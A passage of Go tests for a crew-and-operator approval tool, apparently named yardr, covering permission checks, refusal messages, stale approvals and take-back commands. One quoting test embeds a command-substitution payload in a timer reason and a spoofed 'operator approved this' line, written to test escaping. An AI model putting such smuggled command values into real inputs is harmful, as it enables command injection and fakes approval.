		ProviderTermsSetting:     Alone,
		TelemetrySetting:         Alone,

		WebJWTPrivilegedSessionMaxAgeSetting: Alone,
	}
	for _, setting := range KnownSettings {
		class, ok := want[setting.Key]
		if !ok {
			t.Errorf("setting %s has no run-ask class in the test", setting.Key)
			continue
		}
		if got := settingAsk(setting.Key); got != class {
			t.Errorf("setting %s has class %d, want %d", setting.Key, got, class)
		}
		delete(want, setting.Key)
	}
	for key := range want {
		t.Errorf("run-ask class test names unknown setting %s", key)
	}
	if got := settingAsk("new_setting"); got != Alone {
		t.Errorf("unmarked setting has class %d, want Alone", got)
	}
}

// hook_public_url binds nothing and serves nothing — it only says where
// the yard is reached from outside — so a crew member may propose it as
// a run ask: the card shows the whole URL each hook is registered at,
// approving sets it, and the bind addresses stay the operator's alone.
func TestRunAskHookPublicURL(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "settings set hook_public_url https://yard.example/hooks"), "yardmaster")
	run := y.asked(t, seq).Ask.Run
	if want := []string{
		"setting hook_public_url becomes https://yard.example/hooks (now: unset).",
		"a hook whose source names a register call is registered at this address when its card is approved: the URL of hook <name> is https://yard.example/hooks/<name>.",
	}; !slices.Equal(run.Does, want) {
		t.Fatalf("the card says %q, want %q", run.Does, want)
	}
	if run.Back != `yardr settings set hook_public_url ""` || run.BackBy != "only the operator" {
		t.Fatalf("the take-back is %q by %q", run.Back, run.BackBy)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "hook_public_url = https://yard.example/hooks" {
		t.Fatalf("the approval ran %q", done.Result)
	}
	settings, err := y.Settings(y.ctx)
	if err != nil {
		t.Fatal(err)
	}
	if settings[HookPublicURLSetting] != "https://yard.example/hooks" {
		t.Fatalf("hook_public_url = %q", settings[HookPublicURLSetting])
	}
	evs, err := y.EventsOfKind(y.ctx, "setting_changed", 10)
	if err != nil || len(evs) == 0 {
		t.Fatalf("setting_changed events = %d, %v", len(evs), err)
	}
	y.approved(t, evs[len(evs)-1], seq)
	// A trailing slash registers without it (hookPublicURL), and the
	// card shows the URL as it is registered.
	seq = y.ask(t, listAsk("mckean", "settings set hook_public_url https://yard.example/hooks/"), "yardmaster")
	if got := y.asked(t, seq).Ask.Run.Does; !slices.Contains(got, "a hook whose source names a register call is registered at this address when its card is approved: the URL of hook <name> is https://yard.example/hooks/<name>.") {
		t.Fatalf("the card says %q", got)
	}
	// The addresses the servers bind stay the operator's alone.
	for _, c := range []string{
		"settings set hook_addr 127.0.0.1:9999",
		"settings set router_addr 172.18.0.2",
		"settings set hosted true",
		"settings set web_addr 127.0.0.1:9998",
		"settings set web_pages_addr 127.0.0.1:9997",
		"settings set web_pages_host example.com",
		"settings set bdp_addr 127.0.0.1:9996",
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c), "yardmaster"); err == nil || !strings.Contains(err.Error(), "it is the operator's alone") {
			t.Errorf("--run %q = %v, want the operator's alone", c, err)
		}
	}
}

// A source grant is an operator-only action that may be asked. Its run row
// must use the same check as GrantSource for both the proposer and operator.
func TestRunAskSourceGrantUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	c, argv, err := parseRun([]string{"source grant crm read --group reviewers"})
	if err != nil {
		t.Fatal(err)
	}
	if c.check == nil {
		t.Fatal("source grant has no asker permission check")
	}
	var askerErr, operatorErr error
	if err := y.write(func(w *wtx) error {
		askerErr = c.check(y.ctx, w, argv, "yardmaster")
		operatorErr = c.check(y.ctx, w, argv, "mckean")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	_, directErr := y.GrantSource(y.ctx, "crm", "read", Grantee{Group: "reviewers"}, "", "yardmaster")
	if directErr == nil || askerErr == nil || askerErr.Error() != directErr.Error() {
		t.Fatalf("run row check = %v, direct source grant = %v", askerErr, directErr)
	}
	if class, ok := IsOperatorOnly(askerErr); !ok || class != Askable {
		t.Fatalf("source grant refusal = %v; operator-only class is %v, %v", askerErr, class, ok)
	}
	if operatorErr != nil {
		t.Errorf("operator's source grant check = %v, want allowed", operatorErr)
	}
}

// A source limit run row uses the same permission and source existence
// check as SetSource, including the order of their refusals.
func TestRunAskSourceSetUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	c, argv, err := parseRun([]string{"source set crm calls_per_hour=200"})
	if err != nil {
		t.Fatal(err)
	}
	var rowErr error
	if err := y.write(func(w *wtx) error {
		rowErr = c.check(y.ctx, w, argv, "yardmaster")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	_, directErr := y.SetSource(y.ctx, "crm", SourceCallsPerHour, "200", "yardmaster")
	if directErr == nil || rowErr == nil || rowErr.Error() != directErr.Error() {
		t.Fatalf("run row check = %v, direct source set = %v", rowErr, directErr)
	}
	if class, ok := IsOperatorOnly(rowErr); !ok || class != Askable {
		t.Fatalf("source set refusal = %v; operator-only class is %v, %v", rowErr, class, ok)
	}
	if err := y.write(func(w *wtx) error { return c.check(y.ctx, w, argv, "mckean") }); err != nil {
		t.Errorf("operator's source set check = %v, want allowed", err)
	}
}

// A peer allow that widens mail and exposes a name is alone as a whole.
// The direct command and its run row share the same permission check.
func TestRunAskPeerAllowUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)
	c, argv, err := parseRun([]string{"peer allow airy --send mail --expose ada"})
	if err != nil {
		t.Fatal(err)
	}
	var rowErr error
	if err := y.write(func(w *wtx) error {
		rowErr = c.check(y.ctx, w, argv, "yardmaster")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	_, directErr := y.AllowPeer(y.ctx, "airy", PeerAllow{Send: []string{PeerMail}, Expose: []string{"ada"}}, "yardmaster")
	if rowErr == nil || directErr == nil || rowErr.Error() != directErr.Error() {
		t.Fatalf("run row check = %v, direct peer allow = %v", rowErr, directErr)
	}
	if class, ok := IsOperatorOnly(rowErr); !ok || class != Alone {
		t.Fatalf("peer allow refusal = %v; operator-only class is %v, %v", rowErr, class, ok)
	}
}

// A timer's owner and recipient are checked the same way by RemoveTimer
// and by the run-ask row that proposes removing someone else's timer.
func TestRunAskTimerRmUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)
	id := y.timer(t, "ada", "ada")
	c, argv, err := parseRun([]string{"timer rm " + id})
	if err != nil {
		t.Fatal(err)
	}
	var rowErr error
	if err := y.write(func(w *wtx) error {
		rowErr = c.check(y.ctx, w, argv, "yardmaster")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	_, directErr := y.RemoveTimer(y.ctx, id, "yardmaster")
	if rowErr == nil || directErr == nil || rowErr.Error() != directErr.Error() {
		t.Fatalf("run row check = %v, direct timer removal = %v", rowErr, directErr)
	}
	if class, ok := IsOperatorOnly(rowErr); !ok || class != Askable {
		t.Fatalf("timer removal refusal = %v; operator-only class is %v, %v", rowErr, class, ok)
	}
}

// timer sets an hourly timer of to's by actor, and answers its id.
func (y *askYard) timer(t *testing.T, to, actor string) string {
	t.Helper()
	tm, err := y.AddTimer(y.ctx, NewTimer{To: to, Reason: "stretch", Every: time.Hour}, actor)
	if err != nil {
		t.Fatal(err)
	}
	return tm.ID
}

// The new rows refuse what the command would not do, in the store's own
// words: what names nobody or nothing, names one that is taken or is no
// user, peer or setting, or sets what is the operator's alone. What the
// asker may run themselves is refused as theirs to run.
func TestRunAskNewRowsRefusals(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)
	own := y.timer(t, "ada", "yardmaster")
	sets, err := ParseSets([]string{"peers=airy"})
	if err != nil {
		t.Fatal(err)
	}
	config, err := MergeConfig("yardmaster", map[string]any{}, sets, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Config: config}, "mckean"); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ command, want string }{
		{"user add mckean", "there is a user mckean already"},
		{"user add yardmaster", "that is a crew member's name"},
		{"user add eve bo", "one user, not 2 words"},
		{"user rm", "one user, not 0 words"},
		{"user rm mckean", "is the yard's operator and is not removed"},
		{"user rm eve", "user eve: not found"},
		{"crew set nobody peers=airy", "crew member nobody: not found"},
		{"crew set yardmaster dir=/tmp", "dir is no grant of a crew member, and is set directly"},
		{"crew set yardmaster peers=north", "peer north: not found"},
		{"crew set yardmaster open_threads=erp", "source erp: not found"},
		{"crew set yardmaster --unset peers", "needs no approval: run it yourself"},
		{"settings set nosuch 1", `no setting "nosuch"`},
		{"settings set max_sessions", "unsetting one takes an empty value, and is typed in a terminal"},
		{"settings set operator eve", "may change a setting; this is yardmaster; it is the operator's alone"},
		{"peer rename airy airy", "has that name already"},
		{"peer rename eve north", "peer eve: not found"},
		{"peer rm", "one peer, not 0 words"},
		{"peer rm airy north", "one peer, not 2 words"},
		{"peer rm eve", "peer eve: not found"},
		{"bead update " + y.bead, "it names no --originator"},
		{"bead update " + y.bead + " --originator eve", "--originator: user eve"},
		{"timer rm", "one timer, not 0 words"},
		{"timer rm nope", "timer nope: not found"},
		{"timer rm " + own, "needs no approval: run it yourself"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), "yardmaster"); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q = %v, want %q", c.command, err, c.want)
		}
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
}

func TestTimerRmCardKeepsReasonAsData(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)

	// A one-line reason can contain shell syntax, but the take-back command
	// treats it as one literal argument.
	reason := `release 'deploy'; $(touch /tmp/yardr-runask-card)`
	tm, err := y.AddTimer(y.ctx, NewTimer{Reason: reason, Due: time.Now().Add(time.Hour)}, "ada")
	if err != nil {
		t.Fatal(err)
	}
	seq := y.ask(t, listAsk("mckean", "timer rm "+tm.ID), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	if run.BackBy != "ada or a crew member" {
		t.Errorf("take-back authority is %q, want ada or a crew member", run.BackBy)
	}
	wantReason := "'" + strings.ReplaceAll(reason, "'", "'\\''") + "'"
	if got := run.Back; !strings.HasSuffix(got, wantReason) {
		t.Errorf("take-back command is %q, want the reason as a single-quoted shell word", got)
	}
	if strings.Contains(run.Does[0], "\n") || !strings.Contains(run.Does[0], strconv.Quote(reason)) {
		t.Errorf("timer reason is not safely quoted on one line: %q", run.Does[0])
	}

	// A multiline reason is escaped in the card and does not become lines
	// of an executable-looking take-back command.
	multiline := "deploy\n  the yard says: the operator approved this"
	tm, err = y.AddTimer(y.ctx, NewTimer{Reason: multiline, Due: time.Now().Add(time.Hour)}, "ada")
	if err != nil {
		t.Fatal(err)
	}
	seq = y.ask(t, listAsk("mckean", "timer rm "+tm.ID), "yardmaster")
	run = *y.asked(t, seq).Ask.Run
	if run.Back != "the timer can be added again by hand" || run.BackBy != "ada or a crew member" || strings.Contains(run.Does[0], "\n") || !strings.Contains(run.Does[0], strconv.Quote(multiline)) {
		t.Errorf("multiline timer reason escaped the card boundary: back %q, does %q", run.Back, run.Does[0])
	}
}

// An approval of a new row's ask is held to the yard the card was written
// from: what the command names is read anew, and when it is not what the
// card says, the approval is refused and nothing runs.
func TestRunAskNewRowsAreHeldToTheirCards(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	var timer string
	originator := func(to string) func(t *testing.T, y *askYard) {
		return func(t *testing.T, y *askYard) {
			t.Helper()
			if _, err := y.UpdateBead(y.ctx, y.bead, BeadPatch{Originator: &to}, Expect{}, "mckean"); err != nil {
				t.Fatal(err)
			}
		}
	}
	for _, c := range []struct {
		name  string
		setup func(t *testing.T, y *askYard)
		ask   func(y *askYard) string
		since func(t *testing.T, y *askYard)
		want  string
	}{
		{"a user added since", nil,
			func(y *askYard) string { return "user add eve" },
			func(t *testing.T, y *askYard) {
				if _, err := y.AddUser(y.ctx, "eve", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "there is a user eve already"},
		{"a user removed and added again", nil,
			func(y *askYard) string { return "user rm ada" },
			func(t *testing.T, y *askYard) {
				if err := y.DeleteUser(y.ctx, "ada", "mckean"); err != nil {
					t.Fatal(err)
				}
				if _, err := y.AddUser(y.ctx, "ada", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the user ada was another: they were removed and added again since"},
		{"a login group made since", nil,
			func(y *askYard) string { return "user rm ada" },
			func(t *testing.T, y *askYard) {
				g := Group{Name: "ada-builders", Runner: "herdr", Config: map[string]any{"kind": "claude", "login_for": "ada"}}
				if err := y.PutGroup(y.ctx, g, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "the yard would say \"Groups that carry their login go with them: ada-builders.\" now"},
		{"a crew definition set since", nil,
			func(y *askYard) string { return "crew set yardmaster peers=airy" },
			func(t *testing.T, y *askYard) {
				if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/yard"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the crew member yardmaster was another: its definition was set since"},
		{"an identity set since",
			func(t *testing.T, y *askYard) {
				if _, err := y.PutSource(y.ctx, "crm.yaml", runCRM, "mckean"); err != nil {
					t.Fatal(err)
				}
			},
			func(y *askYard) string { return "crew identity yardmaster --source crm --id u1 --key boss" },
			func(t *testing.T, y *askYard) {
				if err := y.SetIdentity(y.ctx, "yardmaster", "crm", Identity{ID: "u2"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the crew member yardmaster held another identity in crm: it was set since"},
		{"an identity removed since",
			func(t *testing.T, y *askYard) {
				if _, err := y.PutSource(y.ctx, "crm.yaml", runCRM, "mckean"); err != nil {
					t.Fatal(err)
				}
				if err := y.SetIdentity(y.ctx, "yardmaster", "crm", Identity{ID: "u1"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			},
			func(y *askYard) string { return "crew identity yardmaster --source crm --id u2" },
			func(t *testing.T, y *askYard) {
				if err := y.SetIdentity(y.ctx, "yardmaster", "crm", Identity{}, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the crew member yardmaster held another identity in crm: it was removed since"},
		{"a setting changed since", nil,
			func(y *askYard) string { return "settings set max_sessions 20" },
			func(t *testing.T, y *askYard) {
				if err := y.SetSetting(y.ctx, "max_sessions", "30", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when setting max_sessions was another: it was changed since"},
		{"a peer renamed since", nil,
			func(y *askYard) string { return "peer rename airy north" },
			func(t *testing.T, y *askYard) {
				if _, err := y.RenamePeer(y.ctx, "airy", "east", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "peer airy: not found"},
		{"a peer's address set since", nil,
			func(y *askYard) string { return "peer rm airy" },
			func(t *testing.T, y *askYard) {
				if _, err := y.SetPeerURL(y.ctx, "airy", "https://airy.example.com", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the link with airy was called at another address: it was set since (peer_url_set"},
		{"a peer's intakes changed since",
			func(t *testing.T, y *askYard) {
				if err := y.PutDepot(y.ctx, Depot{Name: "web", Base: "origin/main"}, "mckean"); err != nil {
					t.Fatal(err)
				}
				f, err := ParseFlow(arrivalFlow)
				if err != nil {
					t.Fatal(err)
				}
				f.Name = "incoming"
				if _, err := y.PutFlow(y.ctx, *f, "mckean"); err != nil {
					t.Fatal(err)
				}
				if err := y.PutGroup(y.ctx, Group{Name: "builders", Runner: "exec", Config: map[string]any{"cmd": "make build"}}, "mckean"); err != nil {
					t.Fatal(err)
				}
			},
			func(y *askYard) string { return "peer rm airy" },
			func(t *testing.T, y *askYard) {
				if _, err := y.SetPeerIntake(y.ctx, "airy", &PeerIntake{Depot: "web", Flow: "incoming"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the link with airy held other intakes: they were changed since (peer_intake"},
		{"a peer's identities changed since",
			func(t *testing.T, y *askYard) {
				if _, err := y.PutSource(y.ctx, "talk.yaml", talkFile, "mckean"); err != nil {
					t.Fatal(err)
				}
			},
			func(y *askYard) string { return "peer rm airy" },
			func(t *testing.T, y *askYard) {
				if _, err := y.SetPeerIdentity(y.ctx, "airy", PeerIdentity{Source: "talk", ID: "U1", Crew: "mayor"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the link with airy held other identities: one was set since (peer_identity_set"},
		{"a peer's identity removed since",
			func(t *testing.T, y *askYard) {
				if _, err := y.PutSource(y.ctx, "talk.yaml", talkFile, "mckean"); err != nil {
					t.Fatal(err)
				}
				if _, err := y.SetPeerIdentity(y.ctx, "airy", PeerIdentity{Source: "talk", ID: "U1", Crew: "mayor"}, "mckean"); err != nil {
					t.Fatal(err)
				}
			},
			func(y *askYard) string { return "peer rm airy" },
			func(t *testing.T, y *askYard) {
				if _, err := y.RemovePeerIdentity(y.ctx, "airy", "mayor", "talk", "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "was written when the link with airy held other identities: one was removed since (peer_identity_removed"},
		{"an originator changed since", nil,
			func(y *askYard) string { return "bead update " + y.bead + " --originator ada" },
			originator("mckean"), "is for no one now, and it is for mckean"},
		{"an originator already", nil,
			func(y *askYard) string { return "bead update " + y.bead + " --originator ada" },
			originator("ada"), "it is for ada already: nothing is left to change"},
		{"a timer gone since",
			func(t *testing.T, y *askYard) { timer = y.timer(t, "mckean", "mckean") },
			func(y *askYard) string { return "timer rm " + timer },
			func(t *testing.T, y *askYard) {
				if _, err := y.RemoveTimer(y.ctx, timer, "mckean"); err != nil {
					t.Fatal(err)
				}
			}, "timer t1: not found"},
	} {
		t.Run(c.name, func(t *testing.T) {
			y, _ := runYard(t)
			if c.setup != nil {
				c.setup(t, y)
			}
			seq := y.ask(t, listAsk("mckean", c.ask(y)), "yardmaster")
			c.since(t, y)
			y.refusedStale(t, seq, c.want)
		})
	}
}

// A crew member's identity in a source is asked in the yard's form, shown
// with what stood and the command that takes it back, approved in one
// write through setCrewIdentity, and read back as stored. A second ask
// changes it, and its take-back is the identity that stood.
func TestRunAskCrewIdentity(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "crew identity --key boss --source crm yardmaster --id u1"), "yardmaster")
	r := y.asked(t, seq)
	run := r.Ask.Run
	if want := []string{"crew", "identity", "yardmaster", "--source", "crm", "--id", "u1", "--key", "boss"}; !slices.Equal(run.Argv, want) {
		t.Fatalf("the ask holds %q, want %q", run.Argv, want)
	}
	if want := []string{
		"says the crew member yardmaster is u1 / boss in crm: the yard treats mentions and assignments of u1 / boss there as addressed to it.",
		"It has no identity in crm now.",
	}; !slices.Equal(run.Does, want) {
		t.Fatalf("the card says %q, want %q", run.Does, want)
	}
	if run.Back != "yardr crew identity yardmaster --source crm --rm" || run.BackBy != "only the operator" {
		t.Fatalf("the take-back is %q by %q", run.Back, run.BackBy)
	}
	if len(run.Seen["crew yardmaster"]) != 64 || len(run.Seen["source crm"]) != 64 {
		t.Fatalf("the ask keeps seen %q, want SHA-256 hashes of the crew member and the source", run.Seen)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "crew member yardmaster is u1 / boss in crm" {
		t.Fatalf("the approval ran %q", done.Result)
	}
	member, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if got := member.Identities["crm"]; got != (Identity{ID: "u1", Key: "boss"}) {
		t.Fatalf("the crew member is %+v in crm, want u1 / boss", got)
	}
	evs, err := y.EventsOfKind(y.ctx, "identity_set", 10)
	if err != nil || len(evs) == 0 {
		t.Fatalf("identity_set events = %d, %v", len(evs), err)
	}
	y.approved(t, evs[len(evs)-1], seq)
	seq = y.ask(t, listAsk("mckean", "crew identity yardmaster --source crm --key chief"), "yardmaster")
	got := y.asked(t, seq).Ask.Run
	if want := "yardr crew identity yardmaster --source crm --id u1 --key boss"; got.Back != want {
		t.Fatalf("the second ask's take-back is %q, want %q", got.Back, want)
	}
	if want := "It is u1 / boss in crm now."; !slices.Contains(got.Does, want) {
		t.Fatalf("the second card says %q, want it to hold %q", got.Does, want)
	}
}

// A chmod of a command copy under the identity's source after the ask
// makes the approval stale: the card's source fingerprint holds the
// whole destination inventory (path, sha256, mode), as a source set or
// grant card's does since B2.
func TestRunAskCrewIdentityStaleOnChmod(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)
	dir := plantWired(t, y)
	seq := y.ask(t, listAsk("mckean", "crew identity yardmaster --source wired --id u1"), "yardmaster")
	if err := os.Chmod(filepath.Join(dir, "wired", "thread"), 0o600); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "was written from another declaration of the source wired: it was replaced since")
}

// Saying who a crew member is in a source is refused past its row: a
// source the yard declares not, a crew member the yard has not (a user's
// name among them), an asker who may say it themselves, an identity that
// would change nothing, and a command beside the row's form.
func TestRunAskCrewIdentityRefusals(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	for _, c := range []struct{ command, actor, want string }{
		{"crew identity yardmaster --source erp --id u1", "yardmaster", "source erp: not found"},
		{"crew identity nobody --source crm --id u1", "yardmaster", "crew member nobody: not found"},
		{"crew identity ada --source crm --id u1", "yardmaster", "crew member ada: not found"},
		{"crew identity yardmaster --source crm --id u1", "mckean", "needs no approval: run it yourself"},
		{"crew identity yardmaster --id u1", "yardmaster", "one --source, not 0"},
		{"crew identity yardmaster", "yardmaster", "one --source, not 0"},
		{"crew identity yardmaster --source crm", "yardmaster", "--id and/or --key"},
		{"crew identity yardmaster --source crm --id u1 --id u2", "yardmaster", "--id once, not 2 times"},
		{"crew identity yardmaster --source crm --key b1 --key b2", "yardmaster", "--key once, not 2 times"},
		{"crew identity yardmaster --source crm --source erp --id u1", "yardmaster", "one --source, not 2"},
		{"crew identity yardmaster --source crm --id u1 --rm", "yardmaster", "crew identity with --rm is the operator's to type in a terminal"},
		{"crew identity --source crm --id u1", "yardmaster", "one crew member, not 0 words"},
		{"crew identity a b --source crm --id u1", "yardmaster", "one crew member, not 2 words"},
		{"crew identity yardmaster --source crm --key a[bot]", "yardmaster", "'[' is none of their characters"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), c.actor); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q as %s = %v, want %q", c.command, c.actor, err, c.want)
		}
	}
	if err := y.SetIdentity(y.ctx, "yardmaster", "crm", Identity{ID: "u1", Key: "boss"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "crew identity yardmaster --source crm --id u1 --key boss"), "yardmaster"); err == nil || !strings.Contains(err.Error(), "is u1 / boss in crm already") {
		t.Errorf("asking the identity that stands = %v, want it refused as changing nothing", err)
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
}

// A key the source carries lowercase is stored folded however it was
// typed, as a terminal stores it, and the card says so.
func TestRunAskCrewIdentityFoldsTheKey(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	const folding = `name: folding
base: https://folding.example.com/v1
calls:
  ping: { kind: read, request: { method: GET, path: /me } }
identity:
  fold: lower
`
	if _, err := y.PutSource(y.ctx, "folding.yaml", folding, "mckean"); err != nil {
		t.Fatal(err)
	}
	seq := y.ask(t, listAsk("mckean", "crew identity yardmaster --source folding --key YardMaster"), "yardmaster")
	run := y.asked(t, seq).Ask.Run
	if want := "folding carries keys lowercase, so YardMaster is stored as yardmaster."; !slices.Contains(run.Does, want) {
		t.Fatalf("the card says %q, want it to hold %q", run.Does, want)
	}
	if done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil); err != nil {
		t.Fatal(err)
	} else if done.Result != "crew member yardmaster is yardmaster in folding" {
		t.Fatalf("the approval ran %q", done.Result)
	}
	r, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if got := r.Identities["folding"]; got != (Identity{Key: "yardmaster"}) {
		t.Fatalf("the crew member is %+v in folding, want the folded key", got)
	}
}

// Saying who a crew member is in a source is an operator-only action that
// may be asked. Its run row must use the same check as SetIdentity for
// both the proposer and the operator.
func TestRunAskCrewIdentityUsesItsStoreCheck(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	c, argv, err := parseRun([]string{"crew identity yardmaster --source crm --id u1"})
	if err != nil {
		t.Fatal(err)
	}
	if c.check == nil {
		t.Fatal("crew identity has no asker permission check")
	}
	var askerErr, operatorErr error
	if err := y.write(func(w *wtx) error {
		askerErr = c.check(y.ctx, w, argv, "yardmaster")
		operatorErr = c.check(y.ctx, w, argv, "mckean")
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	directErr := y.SetIdentity(y.ctx, "yardmaster", "crm", Identity{ID: "u1"}, "yardmaster")
	if directErr == nil || askerErr == nil || askerErr.Error() != directErr.Error() {
		t.Fatalf("run row check = %v, direct crew identity = %v", askerErr, directErr)
	}
	if class, ok := IsOperatorOnly(askerErr); !ok || class != Askable {
		t.Fatalf("crew identity refusal = %v; operator-only class is %v, %v", askerErr, class, ok)
	}
	if operatorErr != nil {
		t.Errorf("operator's crew identity check = %v, want allowed", operatorErr)
	}
}

// Bringing the yard up is a card to the operator: what starts, what is
// left alone, and that yardr down takes it back. The approval records it
// to be carried out, as a pack apply's does: the server starts the yard's
// processes after the write.
func TestRunAskUp(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "up"), "yardmaster")
	r := y.asked(t, seq)
	run := r.Ask.Run
	if want := []string{"up"}; !slices.Equal(run.Argv, want) {
		t.Fatalf("the ask holds %q, want %q", run.Argv, want)
	}
	if want := []string{
		"starts what the yard needs and is not running: herdr's server, the yard's server and the daemon, with the web view and the BDP server where their addresses are set.",
		"what runs already is left alone.",
	}; !slices.Equal(run.Does, want) {
		t.Fatalf("the card says %q, want %q", run.Does, want)
	}
	if run.Back != "yardr down" || run.BackBy != "" {
		t.Fatalf("the take-back is %q by %q", run.Back, run.BackBy)
	}
	if len(run.Seen) != 0 {
		t.Fatalf("the ask keeps seen %q, want none: up is safe to repeat", run.Seen)
	}
	denied := errors.New("the policy refuses bringing the yard up")
	y.SetPolicy(storePolicyFunc(func(ctx context.Context, tx *bolt.Tx, actor string, act Action, obj Object) error {
		if act == ActBringUp {
			return denied
		}
		return CorePolicy.May(ctx, tx, actor, act, obj)
	}))
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil); err != denied {
		t.Fatalf("the approval under a policy refusing up = %v, want %v", err, denied)
	}
	y.SetPolicy(nil)
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != CarryPending {
		t.Fatalf("the approval ran %q, want %q", done.Result, CarryPending)
	}
	rec, err := y.CarryOf(y.ctx, y.bead, seq)
	if err != nil || rec == nil {
		t.Fatalf("the approval carries %v, %v", rec, err)
	}
	if !slices.Equal(rec.Argv, []string{"up"}) || rec.State != CarryApproved {
		t.Fatalf("the carrying record is %+v", rec)
	}
}

// yardr up with a flag, and an ask from who may run it themselves, are
// refused: the operator types up with --login in a terminal, and up at
// all.
func TestRunAskUpRefusals(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	for _, c := range []struct{ command, actor, want string }{
		{"up --login", "yardmaster", "up with --login is the operator's to type in a terminal"},
		{"up --json", "yardmaster", "up with --json is the operator's to type in a terminal"},
		{"up", "mckean", "needs no approval: run it yourself"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), c.actor); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q as %s = %v, want %q", c.command, c.actor, err, c.want)
		}
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
}

// A crew restart is a card to the operator: a fresh session once the
// current one is idle. The approval requests it as the command does, and
// names the ask on the event.
func TestRunAskCrewRestart(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "crew restart yardmaster"), "ada")
	r := y.asked(t, seq)
	run := r.Ask.Run
	if want := []string{"crew", "restart", "yardmaster"}; !slices.Equal(run.Argv, want) {
		t.Fatalf("the ask holds %q, want %q", run.Argv, want)
	}
	if want := []string{"starts a fresh session of yardmaster once the current one is idle."}; !slices.Equal(run.Does, want) {
		t.Fatalf("the card says %q, want %q", run.Does, want)
	}
	if run.Back != "a requested restart cannot be taken back" || run.BackBy != "nobody" {
		t.Fatalf("the take-back is %q by %q", run.Back, run.BackBy)
	}
	if len(run.Seen["crew yardmaster session"]) != 64 || len(run.Seen["crew yardmaster restart"]) != 64 {
		t.Fatalf("the ask keeps seen %q, want SHA-256 hashes of the session and the request", run.Seen)
	}
	denied := errors.New("the policy refuses restarting crew")
	y.SetPolicy(storePolicyFunc(func(ctx context.Context, tx *bolt.Tx, actor string, act Action, obj Object) error {
		if act == ActRestartCrew {
			return denied
		}
		return CorePolicy.May(ctx, tx, actor, act, obj)
	}))
